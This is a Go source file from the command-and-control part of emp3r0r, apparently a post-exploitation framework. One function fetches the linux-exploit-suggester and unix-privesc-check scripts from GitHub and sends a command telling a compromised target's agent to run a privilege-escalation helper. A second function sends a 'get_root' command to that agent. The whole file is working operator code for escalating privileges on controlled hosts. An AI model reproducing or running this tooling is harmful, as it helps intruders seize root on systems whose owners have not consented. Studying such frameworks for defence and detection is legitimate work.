package cc

import (
	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

func moduleLPE() {
	const (
		lesURL = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
		upcURL = "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check"
	)
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}

	// download third-party LPE helper
	CliPrintInfo("Updating local LPE helpers...")
	err := Download(lesURL, Temp+tun.FileAPI+"lpe_les")
	if err != nil {
		CliPrintWarning("Failed to download LES: %v", err)
		return
	}
	err = Download(upcURL, Temp+tun.FileAPI+"lpe_upc")
	if err != nil {
		CliPrintWarning("Failed to download LES: %v", err)
		return
	}
	// err = PutFile(Temp+tun.FileAPI+"lpe_les", "/tmp/lpe_les", target)
	// if err != nil {
	// 	CliPrintWarning("Failed to upload LES: %v", err)
	// 	return
	// }
	// err = PutFile(Temp+tun.FileAPI+"lpe_upc", "/tmp/lpe_upc", target)
	// if err != nil {
	// 	CliPrintWarning("Failed to upload LES: %v", err)
	// 	return
	// }

	// exec
	CliPrintInfo("This can take some time, please be patient")
	cmd := "!" + Options["lpe_helper"].Val
	CliPrintInfo("Running " + cmd)
	err = SendCmd(cmd, target)
	if err != nil {
		CliPrintError("Run %s: %v", cmd, err)
	}
}

func moduleGetRoot() {
	err := SendCmd("!get_root", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
